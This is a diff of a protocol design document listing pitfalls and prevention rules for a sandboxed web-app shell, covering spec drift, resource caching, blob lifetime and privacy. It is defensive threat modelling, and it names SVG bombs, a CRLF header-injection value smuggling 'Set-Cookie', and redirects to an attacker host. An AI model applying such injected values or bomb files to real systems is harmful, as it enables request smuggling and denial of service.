+- Test suite MUST include the billion-laughs SVG, a `<foreignObject>` SVG, a recursive `<use>` SVG, and verify all are blocked or sanitized.
 
-**Phase:** SPEC (explicit MUST NOT), PACKAGE (types do not expose a set method)
+**Phase:** SPEC (NUB-RESOURCE SVG handling MUST), IMPL (sanitizer + rasterizer), VERIFY (SVG bomb/foreignObject/recursive-use tests), DOCS (shell deployer guidance)
 
-**Confidence:** HIGH — aligns with v0.25.0 design decisions in STATE.md.
+**Confidence:** HIGH — multiple CVEs and documented attack patterns.
 
 ---
 
-### Pitfall 8: Secret Default Values → Baked-In Credentials
+### Pitfall 8: Spec Drift Between PUBLIC `napplet/nubs` and PRIVATE `napplet` Repos
 
-**What goes wrong:** Napplet author declares `{ apiKey: { type: "string", default: "sk-placeholder-123", "x-napplet-secret": true } }`. User installs the napplet; shell applies the default; now every user shares the same "secret" value until they change it. Or: default is legitimately empty-string but the shell renders it as placeholder text that leaks into screenshots.
+**What goes wrong:** This milestone amends NIP-5D (PUBLIC nips repo if/when submitted; currently in PRIVATE napplet repo) AND introduces NUB-RESOURCE (PUBLIC napplet/nubs repo) AND amends NUB-RELAY/IDENTITY/MEDIA (PUBLIC napplet/nubs repo) AND lands implementation in `@napplet/*` packages (PRIVATE napplet repo). The amendments MUST land in sync. If NUB-RESOURCE ships in nubs#NN before NUB-RELAY's `sidecar` field is documented, shells implementing only what's documented will see `relay.event` envelopes with mystery `sidecar` fields and silently drop them per "unrecognized fields are ignored" — losing the optimization.
 
-**Why it happens:** Defaults + secrets are intuitively compatible ("start with this value"), but "default" + "secret" is logically incoherent — a secret with a hardcoded default is not a secret.
+A worse variant: the public NUB-RESOURCE spec refers to `@napplet/nub/resource` as the "reference implementation" — violates `feedback_no_implementations`. The fix is permanent in git history.
 
-**Scope classification:** **SPEC concern** (the wire contract must forbid).
+A subtler variant: the implementation in PRIVATE `@napplet/*` repo evolves the wire shape during the milestone (e.g. adds a `mime` hint field), but the public spec PR isn't updated. Anyone consuming the public spec to build their own shell sees a wire shape that doesn't match the reference implementation's actual behavior. The protocol is no longer the spec.
+
+**Severity:** PROJECT-KILLER if it ships unflagged (the protocol literally drifts). SERIOUS during development (rapid amendment is fine if both sides land before the milestone closes).
 
 **Prevention:**
-- NUB-CONFIG MUST specify: a property with `x-napplet-secret: true` MUST NOT have a `default` value. Shells MUST reject at registerSchema time with a structured error (`{ code: "secret-with-default" }`)
-- NUB-CONFIG SHOULD recommend shells represent unset secrets as `undefined` (not empty string) in the `config.values` payload so napplet code can distinguish "secret not yet configured" from "secret is empty string"
-- Vite-plugin MUST refuse to emit a manifest where `x-napplet-secret: true` coexists with `default`
+- A milestone-level checklist MUST gate "milestone complete" on: (a) all public spec PRs in `napplet/nubs` are merged or have draft PR URLs, (b) NIP-5D in PRIVATE repo matches the version that will be (or has been) submitted to nostr-protocol/nips, (c) every wire envelope shape in `@napplet/nub/resource` has a corresponding type in the public spec.
+- The `napplet/nubs` PRs MUST include a "Coexistence with NUB-RELAY/IDENTITY/MEDIA" section in NUB-RESOURCE describing the sidecar field, the resource-URL flow on identity profile pictures, and the artwork URL flow on media metadata.
+- NUB-RELAY amendment for sidecar MUST specify: "The `sidecar` field is OPTIONAL. Shells MAY include it on `relay.event`. Napplets MUST treat its absence as 'shell did not pre-resolve' and call `resource.bytes()` themselves. Napplets MUST treat its presence as authoritative pre-resolution — DO NOT redundantly call `resource.bytes()` for URLs in the sidecar."
+- The reference implementation in `@napplet/*` MUST gate-check against the public spec at type-check time: spec types are imported from the public NUB spec (or duplicated with an explicit "must match" comment + a CI grep that fails on drift).
+- Per `feedback_no_implementations`: NUB-RESOURCE spec body MUST NOT mention `@napplet/*`, "the reference shim", or "the napplet package". Implementations section MUST be `(none yet)`.
+- Per `feedback_no_private_refs_commits`: Commits in PUBLIC `napplet/nubs` repo MUST describe the protocol change only. PR bodies MUST NOT link back to PRIVATE napplet repo.
 
-**Phase:** SPEC (forbid), PACKAGE (vite-plugin enforcer)
+**Phase:** SPEC (cross-repo coordination + memory compliance), IMPL (CI drift check)
 
-**Confidence:** HIGH
+**Confidence:** HIGH — explicit memory entries.
 
 ---
 
-### Pitfall 9: Secrets in Cleartext postMessage → Any Extension Can Read
+### Pitfall 9: Backwards-Compatibility Patterns Sneaking Into a Hard-Break Milestone
 
-**What goes wrong:** Shell stores secret in OS keychain (great). On `config.subscribe`, shell sends `config.values` with cleartext secret over `postMessage` into the iframe. Any browser extension with `webRequest` or content-script access to the host page sees the cleartext. Dev tools console.log of the event leaks it. Error reporting service captures it.
+**What goes wrong:** The project's stance is explicit: no backwards compatibility, single user, break freely. But the brain reaches for backcompat patterns reflexively:
+- "Add `resource.bytes()` and ALSO leave `fetch` allowed in CSP via `connect-src https:` for napplets that haven't migrated" — DEFEATS THE MILESTONE.
+- "Ship a `@deprecated` wrapper around the old way" — there is no old way; this milestone introduces the primitive.
+- "Provide a fallback if the shell doesn't support the resource NUB" — napplets that need the NUB declare `requires: ["resource"]` per NIP-5D §Manifest; shells that don't support it reject the napplet. No fallback path exists at the protocol level.
+- "Keep the legacy URL field on identity profile picture AND add a resource-URL field" — same field, different semantics; pick one, document the migration as "shells implementing v0.28.0 NUB-IDENTITY MUST treat the URL field as a resource-URL"; no parallel fields.
 
-**Why it happens:** postMessage is not encrypted (and cannot be, since the iframe is sandboxed and has no way to do key exchange with the shell that isn't itself over postMessage — circular). The cleartext transfer is an unavoidable property of the sandbox model.
+A subtler variant: "Add a manifest opt-out for napplets that don't want CSP enforced." This is ostensibly for "developer convenience" but undermines the entire isolation claim.
 
-**Scope classification:** **SPEC concern** (must be called out as a known limitation and documented mitigations listed); **SHELL concern** (actual mitigations).
+**Severity:** PROJECT-KILLER. The whole milestone is browser-enforced isolation; any opt-out path means the property doesn't hold and the marketing is dishonest.
 
 **Prevention:**
-- NUB-CONFIG Security Considerations section MUST state: "Secret values are transmitted cleartext over postMessage to the napplet iframe at `config.values` delivery time. This is a property of the sandbox model — it is NOT a NUB-CONFIG-specific weakness. Shells and napplet authors MUST account for: browser extensions with script access, dev-tools inspection, crash reporters, analytics."
-- NUB-CONFIG SHOULD recommend:
-  - Shells clear console of `config.values` events that contain `x-napplet-secret: true` fields
-  - Napplets SHOULD use secret values and never log them
-  - Napplets SHOULD treat secrets as short-lived — read on demand via a short-TTL subscribe, don't hold in memory indefinitely
-- NUB-CONFIG MUST NOT define a "decrypt in napplet" flow — there is no way to make this actually secret within the sandbox model
-- Spec MUST NOT claim secrets are "secure" — the honest framing is "the shell decides when to deliver; napplet cannot enumerate without the shell's say-so"
+- The milestone's REQUIREMENTS.md MUST include an explicit "NO BACKCOMPAT" section listing the backcompat patterns this milestone explicitly rejects.
+- Code review for this milestone MUST flag any `@deprecated` annotation introduction, any `if (oldShape) ... else ...` defensive branching for new wire types, any "legacy fallback" comment.
+- The NIP-5D §Security amendment MUST state: "Shells implementing this version MUST NOT provide a CSP opt-out for individual napplets. The CSP is part of the shell's enforcement contract; napplets that need different policy must be loaded by a different shell."
+- The vite-plugin MUST NOT expose a "disable CSP" flag in production builds; dev mode MAY have a relaxed mode but MUST emit a console warning AND a build-time warning if dev-relaxation makes it into a production manifest.
+- Roadmap phases MUST explicitly schedule "delete the old code" steps at the start of the milestone, not at the end (where they get cut for time).
 
-**Phase:** SPEC (security section), DOCS (napplet author guidance)
+**Phase:** SPEC (no-opt-out MUST), IMPL (no-fallback discipline + vite-plugin guard), DOCS (REQUIREMENTS.md no-backcompat list)
 
-**Confidence:** HIGH
+**Confidence:** HIGH — explicit project stance per PROJECT.md.
 
 ---
 
-## Moderate Pitfalls (MEDIUM severity)
+### Pitfall 10: Pre-Resolution Sidecar Privacy Leak — Shell Fetches URLs the User Hasn't Engaged With
 
-### Pitfall 10: Subscribe-Live Race — registerSchema vs. First Snapshot
+**What goes wrong:** The sidecar feature is "shell pre-resolves URLs in `relay.event` envelopes so napplets get bytes immediately when they render the event." Sounds great. But: the shell pre-fetches BEFORE the napplet decides to render. Side effects:
+- Avatar URL on every event in a 1000-event timeline → shell makes 1000 HTTP requests to identify each profile picture host. The user is now "online and looking at events" from the perspective of every avatar host — a fingerprint visible to the operator of `image.example.com`.
+- Encrypted DM event arrives with an embedded image URL; shell pre-fetches before user opens the DM, signaling "user is online and got the message" even if the user never reads it.
+- Pre-fetch fails (host down) → shell's pre-resolution miss. Napplet falls back to `resource.bytes()`. Resource policy might rate-limit. Napplet retries. User waits twice.
+- Pre-fetch succeeds → bytes occupy memory in the shell's content cache for events the napplet may never render. 1000 pre-resolved 50KB images = 50MB of "just-in-case" RAM.
 
-**What goes wrong:** Napplet starts; shim calls `config.registerSchema(schema)`, then `config.subscribe(callback)`. If the two messages are not serialized by the shell, the subscribe arrives first, shell has no schema, shell either: (a) sends empty `config.values`, (b) buffers forever, (c) sends an error. Napplet code that assumed defaults would be present now sees `{}` and breaks.
-
-**Why it happens:** postMessage is ordered per-source-per-target, but shell's internal processing may still race if registerSchema triggers async work (reading from disk, decrypting secrets) before emitting values.
-
-**Scope classification:** **SPEC concern** (the ordering guarantee must be stated).
+**Severity:** SERIOUS (privacy regression + memory pressure). Not project-killer because the sidecar is documented as OPTIONAL — but if it's the default, it's silently degrading the privacy story napplets had before this milestone.
 
 **Prevention:**
-- NUB-CONFIG MUST specify: "`config.subscribe` MUST produce its first `config.values` delivery AFTER the most recent `config.registerSchema` from the same napplet has been fully applied (defaults resolved, storage scoped, validation complete). The first delivery MUST contain all declared properties populated with either persisted values or declared defaults."
-- NUB-CONFIG SHOULD specify: if `config.subscribe` is called before any `config.registerSchema`, the shell MUST return an error envelope (`{ code: "no-schema" }`) — NOT silently accept and deliver empty object later
-- NUB-CONFIG MUST define: `config.registerSchema` returns a structured ack (`{ type: "config.registerSchema.result", ok: true, valuesReady: true }`) so napplets can synchronize deterministically
+- NUB-RELAY amendment MUST specify: "Sidecar pre-resolution is OPT-IN at the shell level. Shells SHOULD provide the user with control over which event kinds, which URL hosts, or which napplets receive sidecars. The default policy SHOULD be: do not pre-fetch resources from arbitrary URLs in events."
+- NUB-RELAY amendment MUST specify: "Shells implementing sidecar SHOULD only pre-fetch URLs that match the napplet's manifest-declared resource policy (e.g. profile picture URLs from `nostr:` references that the napplet asked to resolve, blossom hashes, but NOT arbitrary `https:` URLs from event content)."
+- NUB-RESOURCE spec MUST specify: "The shell's resource cache MUST be scoped per (napplet `dTag`, URL canonical form). Napplets MUST NOT see another napplet's cached resources." (Cross-cache poisoning prevention.)
+- Reference shim MUST default sidecar to OFF; provide a configuration knob with a privacy-warning JSDoc.
+- Skill docs MUST cover the privacy tradeoff explicitly.
 
-**Phase:** SPEC (ordering guarantee + ack message), PACKAGE (SDK wrapper should chain register→subscribe)
+**Phase:** SPEC (NUB-RELAY sidecar opt-in MUST), IMPL (default off + scoped cache), DOCS (privacy guidance)
 
-**Confidence:** HIGH
+**Confidence:** HIGH — directly follows from threat modeling.
 
 ---
 
-### Pitfall 11: Rapid Toggle / Debounce — Napplet Receives Every Keystroke
+## Serious Pitfalls (SERIOUS severity)
 
-**What goes wrong:** User drags a slider from 0 to 100. Shell emits `config.values` on every frame. Napplet receives 60 updates/sec. If the napplet is expensive per-update (rebuilds a canvas, re-requests from a relay), the UI hangs.
+### Pitfall 11: Blob Lifetime — Who Owns Revoke?
 
-**Why it happens:** "Subscribe-live" without any delivery-rate guidance invites shells to be too chatty (emit every keystroke) or too stingy (batch to 1Hz, napplet feels laggy). Napplet authors have no predictability.
+**What goes wrong:** Per [MDN URL.createObjectURL docs](https://developer.mozilla.org/en-US/docs/Web/API/URL/createObjectURL_static), every `URL.createObjectURL(blob)` keeps the underlying Blob alive until `URL.revokeObjectURL` is called or the document unloads. A napplet that calls `resource.bytes(url)` 1000 times in a session and creates an object URL each time, never revoking, keeps 1000 Blobs in memory. Per [Bugzilla 939510](https://bugzilla.mozilla.org/show_bug.cgi?id=939510), revocation can fail in some download paths (less relevant here but flag).
 
-**Scope classification:** Mostly **SHELL concern** (the debouncing policy) but NUB-CONFIG MUST provide a predictability contract so napplet authors aren't guessing.
+Worse: the SHELL also holds the Blob (it created it). If the shell retains a reference for caching, AND the napplet retains via createObjectURL, AND neither side revokes, both pay the memory cost for the same bytes.
+
+**Severity:** SERIOUS (slow memory leak; doesn't crash on first use but degrades long sessions).
 
 **Prevention:**
-- NUB-CONFIG SHOULD specify: shells SHOULD coalesce rapid value changes and deliver the terminal value only, with a soft deadline (recommend: 100ms settle time). Shells MUST NOT drop values silently — if a value is persisted, it MUST eventually appear in a `config.values` delivery.
-- NUB-CONFIG MUST NOT mandate a specific debounce interval — that's shell UX
-- NUB-CONFIG MUST define: every `config.values` delivery contains the CURRENT complete state (not a diff). No sequence numbers, no delta application — napplets treat each delivery as authoritative.
-- NUB-CONFIG MAY define an optional `config.values` payload field `{ changed: ["key1", "key2"] }` as a HINT so napplets can skip reactions for unchanged keys — but MUST specify that the hint is non-authoritative (napplet code MUST still handle missing `changed`)
+- NUB-RESOURCE spec MUST specify: "The Blob delivered to the napplet via `resource.bytes()` is owned by the napplet for its lifetime. The shell MAY drop its own reference at any time after delivery; napplets MUST NOT assume the shell will retain it. Napplets MUST call `URL.revokeObjectURL` when finished with object URLs they create."
+- NUB-RESOURCE spec MUST specify: "Shells MAY enforce a per-napplet quota on outstanding `resource.bytes()` Blob bytes (recommend: 50MB default). Exceeding the quota MUST result in a `denied: 'quota-exceeded'` error envelope; existing Blobs are not affected."
+- SDK helper MUST provide a `useResource(url)` pattern that auto-revokes on cleanup (React-hook-style), even though napplets are framework-agnostic.
+- Reference shim's resource cache MUST use a content-addressed (hash) keyed cache with weak references where possible, with explicit eviction policy (LRU + TTL).
 
-**Phase:** SPEC (state-snapshot guarantee, optional changed hint), DOCS (shell-author guidance on debouncing)
+**Phase:** SPEC (lifetime contract), IMPL (SDK helper + shell cache), DOCS (napplet-author guidance)
 
-**Confidence:** MEDIUM — subscription debounce policy is a real source of inconsistency across implementations; calling it out in the spec prevents footguns.
+**Confidence:** HIGH.
 
 ---
 
-### Pitfall 12: Iframe Unmount Leak — Orphaned Subscriptions
+### Pitfall 12: postMessage Structured Clone Copies Megabyte Blobs Twice → Performance Cliff
 
-**What goes wrong:** Napplet's iframe is removed from DOM. Shell still has a subscription keyed on that window. On next value change, shell tries to postMessage to a dead window, gets an error, either logs-and-ignores (memory leak grows) or crashes its internal state.
+**What goes wrong:** Per [MDN Transferable docs](https://developer.mozilla.org/en-US/docs/Web/API/Web_Workers_API/Transferable_objects) and [Surma's "Is postMessage slow?"](https://surma.dev/things/is-postmessage-slow/), structured-clone of a 32MB ArrayBuffer takes ~302ms; transferring it (zero-copy) takes 6.6ms. Blobs are **not** transferable but ARE structured-cloneable (and the spec says they SHOULD be cloned by reference, not copy). In practice browser behavior varies; you cannot rely on cloned Blob being reference-shared.
 
-**Why it happens:** The napplet has no chance to call `config.unsubscribe` — the unmount is abrupt.
+If `resource.bytes()` returns a Blob via postMessage and the shell internally holds an ArrayBuffer for the bytes, the obvious choice is "send the ArrayBuffer as a Transferable" — fast. But then the shell loses its copy. If the shell wants to cache, it needs to clone first. Now the shell has the bytes AND the napplet has the bytes. Caching defeats transfer.
 
-**Scope classification:** **SHELL concern** (lifecycle cleanup). Mentioned here so NUB-CONFIG doesn't invent a bespoke heartbeat that isn't needed.
+**Severity:** SERIOUS for large resources (avatars are small; podcast images are not; future video would be a disaster but is out of scope).
 
 **Prevention:**
-- NUB-CONFIG MUST NOT introduce heartbeats, keep-alives, or liveness probes — rely on the MessageEvent.source becoming invalid (`source.closed === true` OR `postMessage` throwing) as the unmount signal
-- NUB-CONFIG spec MAY include a non-normative note: "Shells SHOULD remove subscriptions associated with a MessageEvent.source when that source becomes invalid, in line with NIP-5D lifecycle handling."
-- The reference shim should demonstrate the pattern — but this is purely a shell implementation concern, not a MUST-level NUB-CONFIG rule
+- NUB-RESOURCE spec MUST specify the wire delivery shape: "Resource bytes are delivered as a `Blob` in the envelope payload. Shells SHOULD use the most efficient transport available (Transferable ArrayBuffer when shell does not need to retain the bytes, structured-clone Blob when caching). The transport choice MUST be invisible to the napplet."
+- NUB-RESOURCE spec SHOULD recommend a payload-size threshold (recommend: 256KB) below which structured-clone is acceptable, above which Transferable should be used.
+- NUB-RESOURCE spec MUST set a hard maximum payload size (recommend: 10MB per resource for v0.28.0; revisit when audio/video lands). Larger resources MUST be denied with `denied: 'resource-too-large'`.
+- Reference shim MUST measure delivery time in dev mode and warn if > 100ms (developer feedback).
 
-**Phase:** SPEC (non-normative note only), INTEGRATION (reference shim)
+**Phase:** SPEC (delivery shape + size cap), IMPL (efficient transport choice), VERIFY (perf test for 5MB delivery < 50ms)
 
-**Confidence:** HIGH — matches how other NUBs handle lifecycle (no heartbeat invented).
+**Confidence:** HIGH.
 
 ---
 
-### Pitfall 13: Default at Property Level vs. Object Level → Ambiguous Resolution
+### Pitfall 13: Cache Stampede — N Napplets Request Same Avatar Simultaneously
 
-**What goes wrong:** Schema declares an object field with both an object-level `default: { foo: "bar", baz: 1 }` AND a property-level `properties: { foo: { default: "quux" } }`. Which wins when the persisted value is missing? JSON Schema itself doesn't say; validators vary.
+**What goes wrong:** A timeline napplet renders 50 events from the same author. Each render triggers `resource.bytes(profile_picture_url)`. The shell's cache is empty. Without coalescing, the shell issues 50 concurrent HTTP requests to the same upstream URL — wasting bandwidth, possibly tripping the upstream's rate limit, and potentially leaking 50 distinct request IDs in the upstream's logs. Per [singleflight pattern](https://1xapi.com/blog/nodejs-cache-stampede-single-flight-pattern-2026), the standard fix is to keep a Map<URL, Promise<Bytes>> and dedupe in-flight requests.
 
-**Why it happens:** JSON Schema's `default` keyword is annotative — the spec does NOT normatively define how defaults are applied. Implementers have invented different behaviors.
-
-**Scope classification:** **SPEC concern** (NUB-CONFIG must pick a rule and state it).
+**Severity:** SERIOUS (degrades performance and privacy; doesn't break correctness).
 
 **Prevention:**
-- NUB-CONFIG MUST specify a deterministic default resolution rule. Recommended rule:
-  1. If a property value is present in persisted store AND validates, use it.
-  2. Else if the property has its own `default` at property level, use that.
-  3. Else if an ancestor object has a `default` that includes this property, use the ancestor's value for this property.
-  4. Else the property is `undefined` in the delivered `config.values`.
-- NUB-CONFIG MUST forbid defaults at nested depths greater than the nesting depth limit (Pitfall 2)
-- NUB-CONFIG SHOULD prohibit recursive defaults (default object containing references to other defaults) — not expressible in JSON Schema anyway, but call out that the shell MUST NOT try to be clever
+- NUB-RESOURCE spec MUST specify: "When multiple `resource.bytes()` requests for the same canonicalized URL are in flight from the same napplet, the shell MUST coalesce them and deliver the same Blob to all callers. Shells SHOULD coalesce across napplets with the same `(dTag, aggregateHash)` scope; shells MAY coalesce across all napplets if the resource is not security-scoped."
+- NUB-RESOURCE spec MUST specify URL canonicalization rules: lowercase scheme/host, decode percent-encoding for unreserved chars, sort query params, drop fragment, normalize path slashes. Without canonicalization, `https://Example.com/x` and `https://example.com/x` cause two cache entries.
+- Reference shim MUST implement single-flight with a Map<canonicalURL, Promise<Blob>>.
+- Test suite MUST include "100 concurrent same-URL requests result in 1 upstream fetch."
 
-**Phase:** SPEC (resolution rule)
+**Phase:** SPEC (single-flight contract + canonicalization), IMPL (single-flight Map), VERIFY (concurrent-request dedup test)
 
-**Confidence:** MEDIUM — JSON Schema defaults are notoriously underspecified; picking a rule is essential for spec-level predictability.
+**Confidence:** HIGH.
 
 ---
 
-### Pitfall 14: Schema Evolution — Tightened Constraints Orphan Valid User Values
+### Pitfall 14: Content-Addressed Cache Invalidation — Avatar Update Goes Stale
 
-**What goes wrong:** Napplet v1 declares `{ maxItems: 100 }`. User fills in 75 items. Napplet v2 changes to `{ maxItems: 50 }`. User launches v2. Shell's options:
-- (a) Reject v2's registerSchema — version is unusable
-- (b) Clamp the array to 50 — silent data loss
-- (c) Keep 75 items, allow schema violation — the schema is a lie
-- (d) Ask the user what to do — modal on every launch
-- (e) Migrate via `$version` delta — napplet author writes a migrator
+**What goes wrong:** Shell caches `https://x/avatar.jpg` content-addressed by `sha256(bytes)`. User updates their avatar; URL stays the same; bytes change. Shell sees URL match, returns stale bytes. URL → hash mapping needs invalidation policy.
 
-None of these is right for every case. The napplet author needs to know which will happen.
+A second variant: the shell exposes the URL → hash mapping to napplets (it shouldn't, per "hashes stay shell-internal" decision, but the temptation arises for "let napplets pre-check if a resource is cached"). Now any napplet can probe the cache for arbitrary URLs and infer what other napplets / users have viewed.
 
-**Scope classification:** NUB-CONFIG defines the PROBLEM surface (`$version` as a potentiality, what the shell MAY do); the actual resolution is **SHELL concern**.
+**Severity:** SERIOUS (stale UX; not a security issue if hashes stay internal).
 
 **Prevention:**
-- NUB-CONFIG MUST specify that a schema MAY carry a `$version` integer field (potentiality). Shells MAY use it to run migrations; shells MAY ignore it.
-- NUB-CONFIG MUST specify that napplets MUST NOT receive values that violate the currently-registered schema at `config.values` delivery time — the shell is responsible for guaranteeing this. If that means clamping, dropping, or asking the user, that is shell's choice.
-- NUB-CONFIG MUST explicitly document (in a "Schema Evolution Notes" non-normative section) that:
-  - Renaming a property is a schema-destructive change (old name is now unknown, additionalProperties:false drops it); napplet authors SHOULD avoid renames or provide a `$version` bump with migration expectations
-  - Type changes are schema-destructive (`integer` → `string` cannot be coerced without loss)
-  - Tightening constraints may cause out-of-bound values; napplet authors MUST accept that shells MAY clamp, drop, or refuse
-  - Removing a property leaves orphaned values; with `additionalProperties:false` default, shells MUST drop them from delivery (Pitfall 5)
-- NUB-CONFIG MUST NOT mandate a specific migration strategy — that's shell UX
+- NUB-RESOURCE spec MUST specify: "The shell's resource cache uses URL as the lookup key. Content-addressed storage of the bytes is an internal optimization; the URL → bytes mapping MUST be invalidated according to standard HTTP cache semantics (Cache-Control headers, ETag revalidation, max-age expiry). Shells MAY apply additional invalidation policy (e.g. shorter TTL for profile pictures)."
+- NUB-RESOURCE spec MUST specify: "Shells MUST NOT expose hash values, cache keys, or cached/uncached status to napplets via the wire protocol. `resource.bytes()` returns Blob or error; nothing else."
+- NUB-RESOURCE spec MUST specify: "When a hash collision is theoretically possible (it isn't for SHA-256, but flag for any future hash choice), shells MUST use SHA-256 or stronger. Shells MUST NOT use MD5 or SHA-1 for content addressing. Shells MUST NOT use truncated hashes."
+- Reference shim MUST honor `Cache-Control: no-cache` and re-fetch on each request for that URL.
 
-**Phase:** SPEC (non-normative guidance + $version potentiality), DOCS (napplet author guidance)
+**Phase:** SPEC (cache semantics + hash internals + algorithm requirements), IMPL (HTTP cache semantics)
 
-**Confidence:** HIGH
+**Confidence:** HIGH.
 
 ---
 
-### Pitfall 15: Orphaned Values After Property Removal — Privacy Bomb
+### Pitfall 15: Napplet Renders Before Sidecar Arrives — Race Condition
 
-**What goes wrong:** User configures `apiKey` in napplet v1. Napplet v2 removes `apiKey` from schema. Shell retains `apiKey` in persisted store "just in case." User thinks they've wiped their key by removing the napplet and reinstalling — it's still there. Or worse: a future napplet v3 re-adds `apiKey`; now they get the old key silently applied.
+**What goes wrong:** Napplet receives `relay.event` envelope. Per the v0.28.0 design, the envelope MAY include a `sidecar` field with pre-resolved bytes. Napplet renders immediately. But: the wire format already shipped means the napplet's existing event handler may not look for `sidecar` (it's a new field). Old napplet code calls `resource.bytes(url)` even when sidecar is present — wasted work.
 
-**Why it happens:** Cautious persistence feels safer, but for user-settings (especially secrets), "retain unknown" is a privacy violation.
+Worse: napplet decides based on a partial envelope (e.g. event metadata arrives, then sidecar arrives in a separate envelope) and rerenders multiple times. If the sidecar is delivered as a separate envelope (e.g. `resource.preresolved` follow-up message), the napplet has to know to wait for it — but waiting introduces latency and a "did we wait long enough" guess.
 
-**Scope classification:** **SPEC concern** (MUST define the retention policy).
+**Severity:** SERIOUS (degrades the optimization the milestone is investing in; confusing to napplet authors).
 
 **Prevention:**
-- NUB-CONFIG MUST specify: upon `config.registerSchema`, the shell MUST NOT deliver any persisted value whose property is not in the current schema. (Already covered by Pitfall 5's `additionalProperties: false` default.)
-- NUB-CONFIG SHOULD specify: shells SHOULD delete persisted values for properties not in the current schema after a grace period (e.g. one session), UNLESS the shell provides an explicit "recover orphaned values" UX
-- NUB-CONFIG MUST specify: for properties marked `x-napplet-secret: true`, shells MUST delete orphaned values IMMEDIATELY on registerSchema (no grace period for secrets)
-- NUB-CONFIG MUST specify: on napplet uninstall (if such a concept exists at the shell level), all persisted values for that `(dTag, aggregateHash)` scope MUST be deleted; shells MUST NOT orphan them
+- NUB-RELAY amendment MUST specify: "Sidecar bytes MUST be delivered in the SAME envelope as the `relay.event`, not as a follow-up message. If the shell cannot pre-resolve in time, the envelope MUST be sent without sidecar — napplets fall back to `resource.bytes()`."
+- NUB-RESOURCE spec MUST specify: "Napplets SHOULD check for sidecar presence before calling `resource.bytes()` for a URL referenced in an event. Shells MAY (but are not required to) detect duplicate `resource.bytes()` calls for sidecar URLs and respond with the cached bytes."
+- SDK helper MUST provide a `resolveResource(event, urlField)` wrapper that prefers sidecar, falls back to `resource.bytes()`.
+- Per the "no backcompat" stance: napplet authors MUST adopt the new pattern; vite-plugin MUST NOT emit a "compatibility shim" that mocks sidecar absence.
 
-**Phase:** SPEC (retention MUSTs)
+**Phase:** SPEC (single-envelope sidecar guarantee), IMPL (SDK wrapper), DOCS (napplet-author migration note)
 
-**Confidence:** HIGH
+**Confidence:** HIGH.
 
 ---
 
-### Pitfall 16: aggregateHash-Coupled Storage — Non-Schema Changes Invalidate Values
+### Pitfall 16: Shell Sets `Content-Disposition` from URL Path — Header Injection
 
-**What goes wrong:** The `aggregateHash` changes on any napplet file change (README, a CSS file), not just schema changes. If storage is keyed on `(dTag, aggregateHash)`, a trivial build update orphans all user values. Shell has to migrate — but since values may not have changed meaning, migration is just "copy old to new" which defeats the point of hash-scoping.
+**What goes wrong:** Per [Axios CRLF advisory](https://github.com/axios/axios/security/advisories/GHSA-fvcv-3m26-pcqx) and [Node undici CRLF fix](https://github.com/nodejs/undici/commit/e43e898603dd5e0c14a75b08b83257598d664a39), HTTP libraries that don't strictly validate header values for CRLF allow request smuggling. If the shell builds the outbound HTTP request from the napplet-supplied URL (e.g. setting `Referer: <shell-page-url>` based on something the napplet influences, OR appending the napplet `dTag` as a custom `X-Napplet-Source` header), and the napplet manages to inject `\r\n` into the value, it can split the request.
 
-Conversely: if storage is keyed on `dTag` alone (not hash), an older napplet version can read newer-version values (which may violate its older schema), leading to validation errors at load.
+A second variant on the response side: shell forwards upstream `Content-Type`, `Content-Disposition`, etc. to the napplet via the envelope. If the napplet's renderer trusts these naively (e.g. uses `Content-Disposition`'s `filename=` to drive a download UI), the shell has just relayed an attacker-controlled value to a sandboxed iframe. Mostly harmless because the iframe is sandboxed, but the shell-side response-splitting (where the upstream's `Content-Type: image/jpeg\r\nSet-Cookie: ...` ends up in the shell's own response handling) is a real risk if the shell parses bytes for cache headers.
 
-**Why it happens:** `aggregateHash` is already the shell's identity unit per v0.9.0 design. Using it as the storage key was the obvious choice. The tradeoff is: every build = new scope. That's a feature (isolation) AND a bug (value loss).
-
-**Scope classification:** **SPEC concern** — the spec must make this tradeoff explicit so napplet authors aren't surprised.
+**Severity:** SERIOUS (depends on the shell's HTTP library; modern Node and browser fetch are strict, but the shell-as-broker model accepts custom header construction).
 
 **Prevention:**
-- NUB-CONFIG MUST specify storage scope as `(dTag, aggregateHash)` — this aligns with v0.25.0 design decisions and existing NUB-STORAGE behavior
-- NUB-CONFIG MUST document (in a "Storage Scope Notes" non-normative section):
-  - Any change to the napplet's aggregate hash creates a new scope
-  - Shells MAY implement cross-hash migration on `$version` bump as a potentiality
-  - Shells MAY NOT migrate silently across `dTag` changes (different napplet identity = different user intent)
-- Napplet authors SHOULD use stable `dTag` across versions and rely on shell-defined migration for value continuity
-- NUB-CONFIG MUST NOT mandate any specific cross-hash behavior — that's shell UX
+- NUB-RESOURCE spec MUST specify: "Shells MUST validate the napplet-supplied URL against a strict URL parser (e.g. WHATWG URL) and MUST reject URLs containing CR, LF, NUL, or other control characters in any component. Shells MUST NOT include any napplet-controllable string in outbound HTTP headers without escaping."
+- NUB-RESOURCE spec MUST specify: "The MIME type delivered to the napplet via `resource.bytes()` is the shell's classified MIME (based on byte sniffing + URL extension + upstream Content-Type), NOT a verbatim copy of the upstream Content-Type header. Shells MUST NOT pass through Set-Cookie, Content-Disposition, Authorization, or any header other than a normalized MIME type and content length."
+- Reference shim MUST use WHATWG URL parsing and explicitly reject control chars.
+- The shell's outbound fetch MUST use a library that validates header values (modern Node fetch / undici, browser fetch).
 
-**Phase:** SPEC (scope rule + non-normative notes)
+**Phase:** SPEC (URL validation + header passthrough rules), IMPL (WHATWG URL + strict library)
 
-**Confidence:** HIGH
+**Confidence:** HIGH.
 
 ---
 
-### Pitfall 17: `openSettings` Spam / Focus Steal
+### Pitfall 17: Shell-Mediated Open Redirect — Napplet Asks for URL A, Gets Bytes from URL B
 
-**What goes wrong:** A malicious or buggy napplet calls `config.openSettings({})` in a tight loop. Shell's settings modal/drawer opens, closes, opens, closes. Focus ping-pongs. User can't interact with anything else.
+**What goes wrong:** Napplet calls `resource.bytes("https://benign.example/img")`. Shell follows redirects (default `fetch` behavior). The benign endpoint redirects to `https://evil.example/img` which serves an SVG bomb. Shell delivered "benign" bytes to the napplet from the napplet's perspective, but they came from evil. Napplet has no idea.
 
-**Why it happens:** `openSettings` is a user-facing UX trigger controllable by untrusted napplet code. Same class of risk as focus-stealing in the keys NUB (Pitfall 5 in the v0.20.0 keys research).
+A second variant: redirect to a private IP (covered in Pitfall 6, but worth re-noting here as the redirect chain is the trigger).
 
-**Scope classification:** The rate limiting is **SHELL concern** (shells decide their own UX); but NUB-CONFIG MUST permit shells to rate-limit and MUST NOT require shells to honor every call.
